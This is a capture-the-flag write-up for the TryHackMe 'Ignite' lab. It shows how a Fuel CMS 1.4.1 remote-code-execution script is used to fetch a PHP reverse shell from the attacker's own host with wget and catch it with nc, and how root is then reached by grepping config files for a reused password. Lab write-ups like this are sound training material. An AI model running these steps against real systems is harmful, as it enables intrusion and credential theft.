# TryHackMe-ignite-ctf-writeup

Write up for "Ignite" simple ctf on https://www.tryhackme.com/

The goal is to retrieve two flags: User.txt and Root.txt

First of all I ran and nmap default syn scan saving the results in a text file

```
nmap -A <machine-ip> -oN nmap_syn_def
```

I found only one port opened wich is 80:

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS

Visiting the site I received a welcome page from Fuel CMS wich also reveals us his version (Version 1.4), which I immediately searched for with searchsploit:

```
searchsploit fuel cms 1.4
```

I found two scripts for RCE for 1.4.1 version, one in ruby and other one in python. I decided to go with the one in python and copied it to my current directory. I opened it with a text editor to see what parameters it asks for. It seems we just need to replace the url on line 14 with the machine IP and fire up burp to be used as proxy by the script. So I fired up burp and the shut down the interceptor. 

I ran the script and it asked for a command, tried with 'ls' and it returns a php page error with the command results on top of it. I see no flag in the current directory, but index.php is right here wich rings a bell to me. I used the script to 'touch test.php' an tried to to ask for the page from firefox; it worked so I decided to try to upload a web shell.

I used a regular php web shell (for kali installation it is located in /usr/share/webshells/php/php-reverse-shell.php by default) named shell.php. Using a text editor i've inserted my machine ip and setted the port to 4445.

Now it was time to upload the shell and see if it actually works. I set up a simple http server with python:

```
python3 -m http.server 80
```

and used RCE script to dowload the shell

```
wget <my-ip>/shell.php
```
It worked, but it downloaded the shell 12 times... honestly I couldn't figure out why was that.

I set up a listener on port 4445

```
nc -lvnp 4445
```

and went on firefox to request the shell, it worked.

I wanted to stabilize the shell so I first ran 

```
python -c 'import pty;pty.spawn("bin/bash")'
```

Then i backgrounded the shell and ran

```
stty raw -echo; fg
```

as last step i prompted

```
export TERM=xterm
```

Now it looks better.

I found the first flag in the current user home...
then I spent so many time trying to do some escalation without results, as I was sure the flag was in /root folder.

Scooping through fuel configuration files i ran

```
cat /var/www/html/fuel/application/config/* | grep password
```

and i found the password for the mysql user. 

After wasting a little time looking in to the database i tried the same password as root password for the server and ... 

www-data@ubuntu:/var/www/html/fuel/application/config$ su  

Password: 

root@ubuntu:/var/www/html/fuel/application/config# whoami

root


Cool.

As i supposed the last flag was in /root.


